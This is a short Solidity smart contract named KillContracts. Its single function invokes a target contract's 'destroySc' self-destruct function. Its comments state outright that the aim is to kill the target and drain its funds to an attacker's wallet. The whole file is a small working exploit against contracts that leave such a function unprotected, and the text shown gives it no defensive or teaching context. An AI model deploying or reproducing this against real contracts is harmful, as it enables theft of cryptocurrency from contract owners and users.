// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;


contract KillContracts {

    // This function kills the smart contract if they have suicide function implemented...
    // After killing them it drains their wallet and transfer the money to the attacker's address/wallet.
    function kill(address _contractAddr,address attacker) public {
        bytes memory data = abi.encodeWithSignature("destroySc(address)", attacker);
        (bool success,) = _contractAddr.call(data);
        require(success,"killing aborted");
    }

}